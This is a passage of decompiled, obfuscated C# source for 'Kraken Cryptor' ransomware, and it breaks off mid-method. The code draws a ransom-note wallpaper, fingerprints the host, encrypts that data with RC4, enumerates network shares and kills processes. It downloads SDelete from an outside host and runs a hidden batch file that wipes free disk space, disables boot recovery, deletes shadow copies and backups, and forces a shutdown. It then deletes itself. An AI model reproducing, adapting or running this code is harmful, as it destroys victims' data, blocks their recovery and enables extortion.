using System;
using System.Collections;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.Globalization;
using System.IO;
using System.IO.Compression;
using System.Linq;
using System.Management;
using System.Net;
using System.Net.NetworkInformation;
using System.Reflection;
using System.Resources;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Security.Principal;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Windows.Forms;
using Main;
using Microsoft.Win32;
using NiceJson;
using ns1;
using ns2;
using ns3;

namespace ns0;

internal sealed class Class27
{
	[DllImport("mscorwks.dll", CharSet = CharSet.Unicode)]
	[return: MarshalAs(UnmanagedType.Bool)]
	static extern bool StrongNameSignatureVerificationEx([MarshalAs(UnmanagedType.LPWStr)] string string_0, [MarshalAs(UnmanagedType.Bool)] bool bool_0, [MarshalAs(UnmanagedType.Bool)] out bool bool_1);

	static void smethod_0(byte[] byte_0, string string_0)
	{
		if (byte_0 == null)
		{
			throw new ArgumentNullException(string_0);
		}
		if (byte_0.Length != 8)
		{
			throw new CryptographicException("Invalid IV size; it must be 8 bytes.");
		}
	}

	static void smethod_1(JsonObject.Class0 class0_0)
	{
		class0_0.int_0 = -1;
		((IDisposable)class0_0.enumerator_0).Dispose();
	}

	static JsonNode smethod_2(string string_0)
	{
		return JsonNode.smethod_0(Class27.smethod_48(string_0));
	}

	static int smethod_3(Class29.Stream0 stream0_0)
	{
		return stream0_0.ReadByte() | (stream0_0.ReadByte() << 8);
	}

	static string smethod_4()
	{
		string text = Class27.smethod_65("Win32_Processor", "UniqueId");
		if (text != "")
		{
			return text;
		}
		text = Class27.smethod_65("Win32_Processor", "ProcessorId");
		if (text != "")
		{
			return text;
		}
		text = Class27.smethod_65("Win32_Processor", "Name");
		if (text == "")
		{
			text = Class27.smethod_65("Win32_Processor", "Manufacturer");
		}
		return text + Class27.smethod_65("Win32_Processor", "MaxClockSpeed");
	}

	static object smethod_5(JsonBasic jsonBasic_0)
	{
		return jsonBasic_0.m_value;
	}

	static uint smethod_6(int int_0, uint uint_0)
	{
		return (uint_0 << int_0) | (uint_0 >> 32 - int_0);
	}

	static bool smethod_7(string string_0)
	{
		if (string.IsNullOrEmpty(string_0))
		{
			return false;
		}
		char c = char.ToUpper(string_0[0]);
		if ('A' <= c && c <= 'Z')
		{
			if (Path.VolumeSeparatorChar != string_0[1])
			{
				return false;
			}
			if (Path.DirectorySeparatorChar != string_0[2])
			{
				return false;
			}
			return true;
		}
		return false;
	}

	[DllImport("mscorwks.dll", CharSet = CharSet.Unicode, EntryPoint = "StrongNameSignatureVerificationEx")]
	[return: MarshalAs(UnmanagedType.Bool)]
	static extern bool StrongNameSignatureVerificationEx_1([MarshalAs(UnmanagedType.LPWStr)] string string_0, [MarshalAs(UnmanagedType.Bool)] bool bool_0, [MarshalAs(UnmanagedType.Bool)] out bool bool_1);

	static void smethod_8()
	{
		try
		{
			string.Concat(string.Concat(string.Concat(string.Concat(string.Concat(string.Concat("" + "Kraken Cryptor", " "), "v"), Class4.Class5.smethod_1()), "!"), Environment.NewLine), Environment.NewLine);
			Image obj = Class27.smethod_26(Regex.Replace(Regex.Replace(Class4.Class5.Class6.smethod_0(), "%1", Environment.UserName), "%2", Class4.Class5.smethod_58() + "-" + Class8.Class9.smethod_6() + "." + Class4.Class5.smethod_60()), Color.Black);
			string text = "";
			text = Path.Combine(Path.GetTempPath(), Path.GetTempFileName() + ".bmp");
			obj.Save(text);
			if (File.Exists(text))
			{
				Miscellaneous.Class18.smethod_0(text, Miscellaneous.Class18.Enum1.const_2);
			}
		}
		catch (Exception)
		{
		}
		try
		{
			string text2 = $"{Environment.SystemDirectory.Substring(0, 1)}:\\ProgramData\\";
			if (!Directory.Exists(text2))
			{
				Directory.CreateDirectory(text2);
			}
			byte[] array;
			using (WebClient webClient = new WebClient())
			{
				array = webClient.DownloadData("https://download.sysinternals.com/files/SDelete.zip");
				if (array == null)
				{
					return;
				}
			}
			string text3 = Path.Combine(text2, "Microsoft.zip");
			File.WriteAllBytes(text3, array);
			Class21 @class = new Class21(text3);
			Class27.smethod_40(@class, text2);
			@class.System_002EIDisposable_002EDispose();
			File.Delete(text3);
			if (!File.Exists(Path.Combine(text2, "sdelete.exe")) && !File.Exists(Path.Combine(text2, "sdelete64.exe")))
			{
				return;
			}
			if (File.Exists(Path.Combine(text2, "Eula.txt")))
			{
				File.Delete(Path.Combine(text2, "Eula.txt"));
			}
			if (!string.IsNullOrEmpty(Environment.GetEnvironmentVariable("PROCESSOR_ARCHITEW6432")))
			{
				if (File.Exists(Path.Combine(text2, "sdelete.exe")))
				{
					File.Delete(Path.Combine(text2, "sdelete.exe"));
				}
				File.Move(Path.Combine(text2, "sdelete64.exe"), Path.Combine(text2, "sdelete.exe"));
			}
			else if (File.Exists(Path.Combine(text2, "sdelete64.exe")))
			{
				File.Delete(Path.Combine(text2, "sdelete64.exe"));
			}
			string text4 = "release.bat";
			string text5 = $":: [Version {Class4.Class5.smethod_1()}]" + Environment.NewLine + Environment.NewLine + "REM [Echo OFF]" + Environment.NewLine + "@echo off" + Environment.NewLine + Environment.NewLine + "REM [Microsoft Sysinternals Eula Accepted]" + Environment.NewLine + "REG ADD \"HKEY_CURRENT_USER\\Software\\Sysinternals\\SDelete\"" + Environment.NewLine + "REG ADD \"HKEY_CURRENT_USER\\Software\\Sysinternals\\SDelete\" /v EulaAccepted /t REG_DWORD /d 1 /f" + Environment.NewLine + Environment.NewLine + "REM [Wipe Drives Free Space]" + Environment.NewLine;
			string[] logicalDrives = Environment.GetLogicalDrives();
			foreach (string text6 in logicalDrives)
			{
				if ((new DriveInfo(text6).IsReady && new DriveInfo(text6).DriveType != DriveType.CDRom) || new DriveInfo(text6).DriveType != 0)
				{
					text5 = ((!(text6.Substring(0, 1) == Environment.SystemDirectory.Substring(0, 1))) ? (text5 + $"cmd.exe /c {text2}sdelete.exe -z {text6.Substring(0, 1)}:{Environment.NewLine}") : (text5 + $"cmd.exe /c {text2}sdelete.exe -c -z {text6.Substring(0, 1)}:{Environment.NewLine}"));
				}
			}
			text5 = text5 + Environment.NewLine + "REM [Start SYSTEM Shutdown Timer]" + Environment.NewLine + string.Format("shutdown /S /F /T {0} /C \"{1}\"", 300, "Unexpected shutdown due to maintenance break.") + Environment.NewLine + Environment.NewLine + "REM [Disable Safe Boot]" + Environment.NewLine + "bcdedit /set {default} recoveryenabled No" + Environment.NewLine + "bcdedit /set {default} bootstatuspolicy ignoreallfailures" + Environment.NewLine + Environment.NewLine + "REM [Delete Backups]" + Environment.NewLine + "wbadmin DELETE SYSTEMSTATEBACKUP -keepVersions:0" + Environment.NewLine + "wmic SHADOWCOPY DELETE" + Environment.NewLine + "vssadmin delete shadows /All" + Environment.NewLine + Environment.NewLine + "REM [Delete Temp Files]" + Environment.NewLine + string.Format("del {0}", Path.Combine(text2, "sdelete.exe")) + Environment.NewLine + $"del {Path.Combine(text2, text4)}";
			File.WriteAllText(Path.Combine(text2, text4), text5);
			Process obj2 = new Process
			{
				StartInfo = 
				{
					CreateNoWindow = true,
					WindowStyle = ProcessWindowStyle.Hidden,
					FileName = "cmd.exe",
					Arguments = $"/C cd {text2} && {text4}"
				}
			};
			new ProcessStartInfo(text2 + text4);
			obj2.Start();
		}
		catch (Exception)
		{
		}
	}

	static string smethod_9()
	{
		return Class27.smethod_65("Win32_VideoController", "DriverVersion") + Class27.smethod_65("Win32_VideoController", "Name");
	}

	static void smethod_10(JsonArray.Class1 class1_0)
	{
		class1_0.int_0 = -1;
		((IDisposable)class1_0.enumerator_0).Dispose();
	}

	[DllImport("mscorwks.dll", CharSet = CharSet.Unicode, EntryPoint = "StrongNameSignatureVerificationEx")]
	[return: MarshalAs(UnmanagedType.Bool)]
	static extern bool StrongNameSignatureVerificationEx_2([MarshalAs(UnmanagedType.LPWStr)] string string_0, [MarshalAs(UnmanagedType.Bool)] bool bool_0, [MarshalAs(UnmanagedType.Bool)] out bool bool_1);

	[DllImport("mscorwks.dll", CharSet = CharSet.Unicode, EntryPoint = "StrongNameSignatureVerificationEx")]
	[return: MarshalAs(UnmanagedType.Bool)]
	static extern bool StrongNameSignatureVerificationEx_3([MarshalAs(UnmanagedType.LPWStr)] string string_0, [MarshalAs(UnmanagedType.Bool)] bool bool_0, [MarshalAs(UnmanagedType.Bool)] out bool bool_1);

	static bool smethod_11(Class2 class2_0)
	{
		if ((class2_0.method_3() & Enum0.flag_2) != 0)
		{
			return false;
		}
		if ((class2_0.method_3() & Enum0.flag_3) != 0)
		{
			return false;
		}
		if ((class2_0.method_3() & Enum0.flag_1) != 0)
		{
			return false;
		}
		if ((class2_0.method_3() & Enum0.flag_4) == 0)
		{
			return true;
		}
		if (Enum0.flag_4 == class2_0.method_3() && !string.IsNullOrEmpty(class2_0.method_1()))
		{
			return true;
		}
		return false;
	}

	static void smethod_12(Class29.Class32 class32_0, int int_0, int int_1)
	{
		if ((class32_0.int_1 += int_0) > 32768)
		{
			throw new InvalidOperationException();
		}
		int num = (class32_0.int_0 - int_1) & 0x7FFF;
		int num2 = 32768 - int_0;
		if (num <= num2 && class32_0.int_0 < num2)
		{
			if (int_0 <= int_1)
			{
				Array.Copy(class32_0.byte_0, num, class32_0.byte_0, class32_0.int_0, int_0);
				class32_0.int_0 += int_0;
			}
			else
			{
				while (int_0-- > 0)
				{
					class32_0.byte_0[class32_0.int_0++] = class32_0.byte_0[num++];
				}
			}
		}
		else
		{
			Class27.smethod_51(class32_0, num, int_0, int_1);
		}
	}

	unsafe static int smethod_13(Class29.Class31 class31_0, byte[] byte_0, int int_0, int int_1)
	{
		void* ptr = stackalloc byte[12];
		*(int*)ptr = 0;
		while (class31_0.int_2 > 0 && int_1 > 0)
		{
			byte_0[int_0++] = (byte)class31_0.uint_0;
			class31_0.uint_0 >>= 8;
			class31_0.int_2 -= 8;
			int_1--;
			(*(int*)ptr)++;
		}
		if (int_1 == 0)
		{
			return *(int*)ptr;
		}
		*(int*)((byte*)ptr + 4) = class31_0.int_1 - class31_0.int_0;
		if (int_1 > *(int*)((byte*)ptr + 4))
		{
			int_1 = *(int*)((byte*)ptr + 4);
		}
		Array.Copy(class31_0.byte_0, class31_0.int_0, byte_0, int_0, int_1);
		class31_0.int_0 += int_1;
		if (((uint)(class31_0.int_0 - class31_0.int_1) & (true ? 1u : 0u)) != 0)
		{
			byte[] byte_ = class31_0.byte_0;
			*(int*)((byte*)ptr + 8) = class31_0.int_0;
			class31_0.int_0 = *(int*)((byte*)ptr + 8) + 1;
			class31_0.uint_0 = byte_[*(int*)((byte*)ptr + 8)] & 0xFFu;
			class31_0.int_2 = 8;
		}
		return *(int*)ptr + int_1;
	}

	static void smethod_14(int int_0)
	{
		try
		{
			string arg = string.Concat("ping 127.0.0.1 -n 3 > NUL&&" + $"del /Q /F /S \"{Application.get_ExecutablePath()}\"");
			Process process = new Process();
			process.StartInfo.FileName = "cmd.exe";
			process.StartInfo.Arguments = $"/C {arg}";
			process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
			process.Start();
			Environment.Exit(int_0);
		}
		catch (Exception)
		{
		}
	}

	static void smethod_15(Class29.Class31 class31_0)
	{
		class31_0.uint_0 >>= class31_0.int_2 & 7;
		class31_0.int_2 &= -8;
	}

	static ResourceManager smethod_16()
	{
		if (Class20.resourceManager_0 == null)
		{
			Class20.resourceManager_0 = new ResourceManager("ns2.Class20", typeof(Class20).Assembly);
		}
		return Class20.resourceManager_0;
	}

	[DllImport("netapi32", CharSet = CharSet.Unicode)]
	static extern int NetShareEnum(string string_0, int int_0, out IntPtr intptr_0, int int_1, out int int_2, out int int_3, ref int int_4);

	static string smethod_17()
	{
		if (IntPtr.Size == 8)
		{
			return "64BIT";
		}
		return "32BIT";
	}

	static int smethod_18(Class29.Class31 class31_0, int int_0)
	{
		if (class31_0.int_2 < int_0)
		{
			if (class31_0.int_0 == class31_0.int_1)
			{
				return -1;
			}
			class31_0.uint_0 |= (uint)(((class31_0.byte_0[class31_0.int_0++] & 0xFF) | ((class31_0.byte_0[class31_0.int_0++] & 0xFF) << 8)) << class31_0.int_2);
			class31_0.int_2 += 16;
		}
		return (int)(class31_0.uint_0 & ((1 << int_0) - 1));
	}

	[DllImport("mscorwks.dll", CharSet = CharSet.Unicode, EntryPoint = "StrongNameSignatureVerificationEx")]
	[return: MarshalAs(UnmanagedType.Bool)]
	static extern bool StrongNameSignatureVerificationEx_4([MarshalAs(UnmanagedType.LPWStr)] string string_0, [MarshalAs(UnmanagedType.Bool)] bool bool_0, [MarshalAs(UnmanagedType.Bool)] out bool bool_1);

	static Class29.Class33 smethod_19(Class29.Class34 class34_0)
	{
		byte[] array = new byte[class34_0.int_4];
		Array.Copy(class34_0.byte_1, class34_0.int_3, array, 0, class34_0.int_4);
		return new Class29.Class33(array);
	}

	static Size smethod_20()
	{
		IntPtr hdc = Graphics.FromHwnd(IntPtr.Zero).GetHdc();
		return new Size(height: Class27.GetDeviceCaps(hdc, 117), width: Class27.GetDeviceCaps(hdc, 118));
	}

	static void smethod_21(int int_0, Class21.Class23 class23_0, byte[] byte_0)
	{
		for (int i = 0; i < int_0; i++)
		{
			class23_0.uint_1 = (class23_0.uint_1 >> 8) ^ Class21.Class23.uint_0[byte_0[i] ^ (class23_0.uint_1 & 0xFF)];
		}
	}

	static bool smethod_22(JsonNode jsonNode_0)
	{
		return (bool)Convert.ChangeType(((JsonBasic)jsonNode_0).m_value, typeof(bool));
	}

	static byte[] smethod_23()
	{
		return (byte[])Class27.smethod_16().GetObject("configurations", Class20.cultureInfo_0);
	}

	static ICryptoTransform smethod_24(bool bool_0, byte[] byte_0, byte[] byte_1)
	{
		using DESCryptoServiceProvider dESCryptoServiceProvider = new DESCryptoServiceProvider();
		return bool_0 ? dESCryptoServiceProvider.CreateDecryptor(byte_1, byte_0) : dESCryptoServiceProvider.CreateEncryptor(byte_1, byte_0);
	}

	static byte[] smethod_25(byte[] byte_0, byte[] byte_1, byte[] byte_2)
	{
		try
		{
			using Class10.Class11 @class = new Class10.Class11();
			using MemoryStream memoryStream = new MemoryStream();
			@class.Key = byte_2;
			@class.IV = byte_0;
			using (CryptoStream cryptoStream = new CryptoStream(memoryStream, @class.CreateEncryptor(), CryptoStreamMode.Write))
			{
				cryptoStream.Write(byte_1, 0, byte_1.Length);
			}
			return memoryStream.ToArray();
		}
		catch (Exception)
		{
			return null;
		}
	}

	unsafe static Image smethod_26(string string_0, Color color_0)
	{
		//IL_0026: Unknown result type (might be due to invalid IL or missing references)
		//IL_002c: Expected O, but got Unknown
		//IL_0121: Unknown result type (might be due to invalid IL or missing references)
		//IL_0128: Expected O, but got Unknown
		//IL_01f5: Unknown result type (might be due to invalid IL or missing references)
		//IL_01fc: Expected O, but got Unknown
		//IL_01ff: Unknown result type (might be due to invalid IL or missing references)
		//IL_0225: Expected O, but got Unknown
		void* ptr = stackalloc byte[48];
		try
		{
			Size size = Class27.smethod_20();
			*(int*)ptr = size.Width;
			*(int*)((byte*)ptr + 4) = size.Height;
			Bitmap val = new Bitmap(*(int*)ptr, *(int*)((byte*)ptr + 4));
			Random random = new Random();
			*(int*)((byte*)ptr + 12) = 0;
			while (*(int*)((byte*)ptr + 12) < *(int*)((byte*)ptr + 4))
			{
				*(int*)((byte*)ptr + 16) = 0;
				while (*(int*)((byte*)ptr + 16) < *(int*)ptr)
				{
					*(int*)((byte*)ptr + 20) = 128;
					*(int*)((byte*)ptr + 24) = 256;
					*(int*)((byte*)ptr + 28) = random.Next(*(int*)((byte*)ptr + 20), *(int*)((byte*)ptr + 24));
					*(int*)((byte*)ptr + 32) = random.Next(*(int*)((byte*)ptr + 20), *(int*)((byte*)ptr + 24));
					*(int*)((byte*)ptr + 36) = random.Next(*(int*)((byte*)ptr + 20), *(int*)((byte*)ptr + 24));
					*(int*)((byte*)ptr + 40) = random.Next(*(int*)((byte*)ptr + 20), *(int*)((byte*)ptr + 24));
					val.SetPixel(*(int*)((byte*)ptr + 16), *(int*)((byte*)ptr + 12), Color.FromArgb(*(int*)((byte*)ptr + 28), *(int*)((byte*)ptr + 32), *(int*)((byte*)ptr + 36), *(int*)((byte*)ptr + 40)));
					(*(int*)((byte*)ptr + 16))++;
				}
				(*(int*)((byte*)ptr + 12))++;
			}
			Image val2 = (Image)(object)val;
			Graphics val3 = Graphics.FromImage(val2);
			Font val4 = new Font("Times New Roman", 16f);
			string[] array = string_0.Split(new string[3] { "\r\n", "\r", "\n" }, StringSplitOptions.None);
			*(int*)((byte*)ptr + 8) = 50;
			string[] array2 = array;
			*(int*)((byte*)ptr + 44) = 0;
			while (*(int*)((byte*)ptr + 44) < array2.Length)
			{
				string text = array2[*(int*)((byte*)ptr + 44)];
				_ = size.Width;
				_ = size.Height;
				if (text == "")
				{
					*(int*)((byte*)ptr + 8) += 20;
				}
				else
				{
					*(int*)((byte*)ptr + 8) += 40;
				}
				PointF pointF = new PointF(size.Height / 2 + size.Width / 50, *(int*)((byte*)ptr + 8));
				SizeF sizeF = val3.MeasureString(text, val4);
				new RectangleF(pointF.X, pointF.Y, sizeF.Width, sizeF.Height);
				Brush val5 = (Brush)new SolidBrush(Color.White);
				val3.FillRectangle((Brush)new SolidBrush(color_0), pointF.X, pointF.Y, sizeF.Width, sizeF.Height);
				val3.DrawString(text, val4, val5, pointF);
				(*(int*)((byte*)ptr + 44))++;
			}
			return val2;
		}
		catch (Exception)
		{
		}
		return null;
	}

	static bool smethod_27(Assembly assembly_0, Assembly assembly_1)
	{
		return true;
	}

	static string smethod_28(Miscellaneous.Class16 class16_0)
	{
		return "Microsoft " + class16_0.method_0() + " [Version " + class16_0.method_4() + "." + class16_0.method_2() + "." + class16_0.method_6() + "]-" + Class27.smethod_17();
	}

	unsafe static bool smethod_29(string[] string_0)
	{
		void* ptr = stackalloc byte[9];
		try
		{
			string string_ = "tasklist";
			string string_2 = "/V /FO CSV";
			string[] array = Class27.smethod_91(string_2, string_).Split(new string[3] { "\r\n", "\r", "\n" }, StringSplitOptions.None);
			List<string> list = new List<string>();
			*(int*)ptr = 0;
			while (*(int*)ptr < array.Length)
			{
				string text = array[*(int*)ptr].Split(new char[1] { ',' })[0].ToLower().Replace("\"", "");
				if (!(text == "") && text.Contains(".exe"))
				{
					list.Add(array[*(int*)ptr].Split(new char[1] { ',' })[0].ToLower().Replace("\"", "").Replace(".exe", ""));
				}
				(*(int*)ptr)++;
			}
			string[] array2 = list.ToArray();
			*(int*)((byte*)ptr + 4) = 0;
			while (*(int*)((byte*)ptr + 4) < array2.Length)
			{
				string text2 = array2[*(int*)((byte*)ptr + 4)];
				if (string_0.Contains(text2))
				{
					Class27.smethod_98("taskkill", $"/F /IM {text2}.exe");
				}
				(*(int*)((byte*)ptr + 4))++;
			}
			((byte*)ptr)[8] = 1;
		}
		catch (Exception)
		{
			((byte*)ptr)[8] = 0;
		}
		return ((byte*)ptr)[8] != 0;
	}

	static int smethod_30(Class29.Class31 class31_0)
	{
		return class31_0.int_2;
	}

	unsafe static byte[] smethod_31(byte[] byte_0, byte[] byte_1)
	{
		void* ptr = stackalloc byte[8];
		int[] array = new int[256];
		int[] array2 = new int[256];
		byte[] array3 = new byte[byte_1.Length];
		int i;
		for (i = 0; i < 256; i++)
		{
			array[i] = byte_0[i % byte_0.Length];
			array2[i] = i;
		}
		i = 0;
		int num = 0;
		for (; i < 256; i++)
		{
			num = (num + array2[i] + array[i]) % 256;
			*(int*)((byte*)ptr + 4) = array2[i];
			array2[i] = array2[num];
			array2[num] = *(int*)((byte*)ptr + 4);
		}
		i = 0;
		num = 0;
		int num2 = 0;
		for (; i < byte_1.Length; i++)
		{
			num2++;
			num2 %= 256;
			num += array2[num2];
			num %= 256;
			*(int*)((byte*)ptr + 4) = array2[num2];
			array2[num2] = array2[num];
			array2[num] = *(int*)((byte*)ptr + 4);
			*(int*)ptr = array2[(array2[num2] + array2[num]) % 256];
			array3[i] = (byte)(byte_1[i] ^ *(uint*)ptr);
		}
		return array3;
	}

	unsafe static bool smethod_32()
	{
		void* ptr = stackalloc byte[9];
		try
		{
			string string_ = "Unknown";
			*(int*)ptr = 16;
			Class8.Class9.smethod_7(Class27.smethod_49(5, bool_0: false));
			Class8.Class9.smethod_7(Class8.Class9.smethod_6().ToUpper());
			string text = Class27.smethod_102();
			if (text != null && !(text == ""))
			{
				if (text.Split(new char[1] { ',' })[0] == "")
				{
					Class8.Class9.smethod_11(string_);
				}
				else
				{
					Class8.Class9.smethod_11(text.Split(new char[1] { ',' })[0]);
				}
				if (text.Split(new char[1] { ',' })[1] == "")
				{
					Class8.Class9.smethod_13(string_);
				}
				else
				{
					Class8.Class9.smethod_13(text.Split(new char[1] { ',' })[1]);
				}
				if (text.Split(new char[1] { ',' })[2] == "")
				{
					Class8.Class9.smethod_19(string_);
				}
				else
				{
					Class8.Class9.smethod_19(text.Split(new char[1] { ',' })[2]);
				}
				if (text.Split(new char[1] { ',' })[3] == "")
				{
					Class8.Class9.smethod_17(string_);
				}
				else
				{
					Class8.Class9.smethod_17(text.Split(new char[1] { ',' })[3]);
				}
			}
			else
			{
				Class8.Class9.smethod_11(string_);
				Class8.Class9.smethod_13(string_);
				Class8.Class9.smethod_19(string_);
				Class8.Class9.smethod_17(string_);
			}
			string text2 = Class27.smethod_122();
			if (!string.IsNullOrEmpty(text2))
			{
				Class8.Class9.smethod_15(text2);
			}
			else
			{
				Class8.Class9.smethod_15(string_);
			}
			Class8.Class9.smethod_9(Environment.OSVersion.ToString());
			string[] logicalDrives = Environment.GetLogicalDrives();
			*(int*)((byte*)ptr + 4) = 0;
			while (*(int*)((byte*)ptr + 4) < logicalDrives.Length)
			{
				DriveInfo driveInfo = new DriveInfo(logicalDrives[*(int*)((byte*)ptr + 4)]);
				Class8.Class9.smethod_21(Class8.Class9.smethod_20() + 1);
				if (driveInfo.IsReady)
				{
					if (driveInfo.DriveType == DriveType.Fixed)
					{
						Class8.Class9.smethod_23(Class8.Class9.smethod_22() + 1);
					}
					if (driveInfo.DriveType == DriveType.Network)
					{
						Class8.Class9.smethod_25(Class8.Class9.smethod_24() + 1);
					}
					Class8.Class9.smethod_27(Class8.Class9.smethod_26() + Convert.ToInt32((driveInfo.TotalSize - driveInfo.TotalFreeSpace) / 1000000000L));
				}
				(*(int*)((byte*)ptr + 4))++;
			}
			Class8.Class9.smethod_3(Class27.smethod_60(Class4.Class5.smethod_42()));
			Class8.Class9.smethod_5(Class27.smethod_60(*(int*)ptr));
			string s = Class27.smethod_57(Class8.Class9.smethod_2()) + char.ToString(',') + Class27.smethod_57(Class8.Class9.smethod_4()) + char.ToString(',') + Class8.Class9.smethod_8() + char.ToString(',') + Class8.Class9.smethod_14() + char.ToString(',') + Class8.Class9.smethod_10() + char.ToString(',') + Class8.Class9.smethod_12() + char.ToString(',') + Class8.Class9.smethod_16() + char.ToString(',') + Class8.Class9.smethod_18() + char.ToString(',') + Convert.ToString(Class8.Class9.smethod_20()) + char.ToString(',') + Convert.ToString(Class8.Class9.smethod_22()) + char.ToString(',') + Convert.ToString(Class8.Class9.smethod_24()) + char.ToString(',') + Convert.ToString(Class8.Class9.smethod_26()) + char.ToString(',') + Convert.ToString(Class4.Class5.smethod_34()) + char.ToString(',') + Convert.ToString(Class4.Class5.smethod_1());
			byte[] bytes = Encoding.UTF8.GetBytes(s);
			byte[] byte_ = Class27.smethod_60(Class4.Class5.smethod_40());
			bytes = Class27.smethod_31(byte_, bytes);
			byte_ = Class27.smethod_54(byte_, Class4.Class5.smethod_38());
			byte[] byte_2 = Class27.smethod_95(new byte[2][] { bytes, byte_ });
			if (byte_ == null)
			{
				((byte*)ptr)[8] = 0;
			}
			else
			{
				Class8.Class9.smethod_1(Class27.smethod_44(Class27.smethod_119(byte_2), 64));
				((byte*)ptr)[8] = 1;
			}
		}
		catch (Exception)
		{
			goto IL_03ef;
		}
		return ((byte*)ptr)[8] != 0;
		IL_03ef:
		return false;
	}

	unsafe static void smethod_33(string string_0, Class3 class3_0)
	{
		void* ptr = stackalloc byte[32];
		*(int*)ptr = 2;
		*(int*)((byte*)ptr + 4) = 0;
		IntPtr intptr_ = IntPtr.Zero;
		try
		{
			*(int*)((byte*)ptr + 16) = Class27.NetShareEnum(string_0, *(int*)ptr, out intptr_, -1, out *(int*)((byte*)ptr + 8), out *(int*)((byte*)ptr + 12), ref *(int*)((byte*)ptr + 4));
			if (5 == *(int*)((byte*)ptr + 16))
			{
				*(int*)ptr = 1;
				*(int*)((byte*)ptr + 16) = Class27.NetShareEnum(string_0, *(int*)ptr, out intptr_, -1, out *(int*)((byte*)ptr + 8), out *(int*)((byte*)ptr + 12), ref *(int*)((byte*)ptr + 4));
			}
			if (*(int*)((byte*)ptr + 16) != 0 || *(int*)((byte*)ptr + 8) <= 0)
			{
				return;
			}
			Type type = ((2 == *(int*)ptr) ? typeof(Class3.Struct0) : typeof(Class3.Struct1));
			*(int*)((byte*)ptr + 20) = Marshal.SizeOf(type);
			*(int*)((byte*)ptr + 24) = 0;
			*(int*)((byte*)ptr + 28) = intptr_.ToInt32();
			while (*(int*)((byte*)ptr + 24) < *(int*)((byte*)ptr + 8))
			{
				IntPtr ptr2 = new IntPtr(*(int*)((byte*)ptr + 28));
				if (1 == *(int*)ptr)
				{
					Class3.Struct1 @struct = (Class3.Struct1)Marshal.PtrToStructure(ptr2, type);
					class3_0.method_0(@struct.string_0, string.Empty, @struct.enum0_0, @struct.string_1);
				}
				else
				{
					Class3.Struct0 struct2 = (Class3.Struct0)Marshal.PtrToStructure(ptr2, type);
					class3_0.method_0(struct2.string_0, struct2.string_2, struct2.enum0_0, struct2.string_1);
				}
				(*(int*)((byte*)ptr + 24))++;
				*(int*)((byte*)ptr + 28) += *(int*)((byte*)ptr + 20);
			}
		}
		finally
		{
			if (IntPtr.Zero != intptr_)
			{
				Class27.NetApiBufferFree(intptr_);
			}
		}
	}

	unsafe static bool smethod_34(string string_0)
	{
		void* ptr = stackalloc byte[5];
		try
		{
			Process[] processes = Process.GetProcesses();
			*(int*)ptr = 0;
			while (*(int*)ptr < processes.Length)
			{
				Process process = processes[*(int*)ptr];
				if (process.MainWindowTitle.Contains(string_0) || process.ProcessName.Contains(string_0))
				{
					process.Dispose();
					GC.Collect();
					GC.WaitForPendingFinalizers();
					GC.Collect();
					((byte*)ptr)[4] = 1;
				}
				(*(int*)ptr)++;
			}
			((byte*)ptr)[4] = 0;
		}
		catch (Exception)
		{
			((byte*)ptr)[4] = 0;
		}
		return ((byte*)ptr)[4] != 0;
	}

	static void smethod_35(byte[] byte_0, byte[] byte_1, Class10.Class11.Class12 class12_0)
	{
		class12_0.uint_0 = new uint[16];
		class12_0.uint_0[1] = Class27.smethod_94(byte_1, 0);
		class12_0.uint_0[2] = Class27.smethod_94(byte_1, 4);
		class12_0.uint_0[3] = Class27.smethod_94(byte_1, 8);
		class12_0.uint_0[4] = Class27.smethod_94(byte_1, 12);
		byte[] byte_2 = ((byte_1.Length == 32) ? Class10.Class11.Class12.byte_0 : Class10.Class11.Class12.byte_1);
		int num = byte_1.Length - 16;
		class12_0.uint_0[11] = Class27.smethod_94(byte_1, num);
		class12_0.uint_0[12] = Class27.smethod_94(byte_1, num + 4);
		class12_0.uint_0[13] = Class27.smethod_94(byte_1, num + 8);
		class12_0.uint_0[14] = Class27.smethod_94(byte_1, num + 12);
		class12_0.uint_0[0] = Class27.smethod_94(byte_2, 0);
		class12_0.uint_0[5] = Class27.smethod_94(byte_2, 4);
		class12_0.uint_0[10] = Class27.smethod_94(byte_2, 8);
		class12_0.uint_0[15] = Class27.smethod_94(byte_2, 12);
		class12_0.uint_0[6] = Class27.smethod_94(byte_0, 0);
		class12_0.uint_0[7] = Class27.smethod_94(byte_0, 4);
		class12_0.uint_0[8] = 0u;
		class12_0.uint_0[9] = 0u;
	}

	unsafe static void smethod_36(byte[] byte_0, Class29.Class33 class33_0)
	{
		void* ptr = stackalloc byte[64];
		int[] array = new int[16];
		int[] array2 = new int[16];
		*(int*)((byte*)ptr + 12) = 0;
		while (*(int*)((byte*)ptr + 12) < byte_0.Length)
		{
			*(int*)((byte*)ptr + 16) = byte_0[*(int*)((byte*)ptr + 12)];
			if (*(int*)((byte*)ptr + 16) > 0)
			{
				array[*(int*)((byte*)ptr + 16)]++;
			}
			(*(int*)((byte*)ptr + 12))++;
		}
		*(int*)ptr = 0;
		*(int*)((byte*)ptr + 4) = 512;
		*(int*)((byte*)ptr + 20) = 1;
		while (*(int*)((byte*)ptr + 20) <= 15)
		{
			array2[*(int*)((byte*)ptr + 20)] = *(int*)ptr;
			*(int*)ptr += array[*(int*)((byte*)ptr + 20)] << 16 - *(int*)((byte*)ptr + 20);
			if (*(int*)((byte*)ptr + 20) >= 10)
			{
				*(int*)((byte*)ptr + 24) = array2[*(int*)((byte*)ptr + 20)] & 0x1FF80;
				*(int*)((byte*)ptr + 28) = *(int*)ptr & 0x1FF80;
				*(int*)((byte*)ptr + 4) += *(int*)((byte*)ptr + 28) - *(int*)((byte*)ptr + 24) >> 16 - *(int*)((byte*)ptr + 20);
			}
			(*(int*)((byte*)ptr + 20))++;
		}
		class33_0.short_0 = new short[*(int*)((byte*)ptr + 4)];
		*(int*)((byte*)ptr + 8) = 512;
		*(int*)((byte*)ptr + 32) = 15;
		while (*(int*)((byte*)ptr + 32) >= 10)
		{
			*(int*)((byte*)ptr + 36) = *(int*)ptr & 0x1FF80;
			*(int*)ptr -= array[*(int*)((byte*)ptr + 32)] << 16 - *(int*)((byte*)ptr + 32);
			*(int*)((byte*)ptr + 40) = *(int*)ptr & 0x1FF80;
			while (*(int*)((byte*)ptr + 40) < *(int*)((byte*)ptr + 36))
			{
